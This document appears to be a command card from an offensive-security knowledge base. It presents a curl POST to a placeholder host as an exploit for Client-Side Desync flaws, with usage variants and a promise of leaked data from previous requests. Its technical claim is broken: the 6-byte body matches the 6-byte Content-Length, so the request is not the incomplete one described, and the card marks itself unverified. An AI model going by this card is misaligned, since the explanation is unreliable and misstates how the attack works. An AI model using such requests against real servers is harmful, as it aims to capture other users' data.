---
data: 'curl -X POST http://target.com/ -H ''Content-Length: 6'' --data ''incomp'''
tags:
  - http
  - exploitation
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: c41b2b7a-a656-4bff-b209-0dbe0e3d9490
created_at: '2025-12-13T09:01:22.514Z'
updated_at: '2025-12-13T09:01:22.514Z'
verified: false
validated: true
submitted: true
---
# curl-send-incomplete-post

## Command

```bash
curl -X POST http://target.com/ -H 'Content-Length: 6' --data 'incomp'
```

## Description

This command sends an incomplete HTTP POST request using curl to exploit Client-Side Desync vulnerabilities, such as in Apache Tomcat, by mismatching the Content-Length header.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies POST method | Yes |
| `-H 'Content-Length: 6'` | Sets Content-Length to 6 | Yes |
| `--data 'incomp'` | Provides incomplete body data | Yes |

## Examples

### Basic Usage

```bash
curl -X POST http://target.com/ -H 'Content-Length: 6' --data 'incomp'
```

### Advanced Usage

```bash
curl -X POST https://target.com/ -H 'Content-Length: 6' --data 'incomp' -k > response.txt
```

## Expected Output

Server error response, potentially including leaked data from previous requests.

## Related

- [[commands/netcat-send-http-request]]
- [[procedures/Craft-and-Send-Incomplete-POST-Request]]
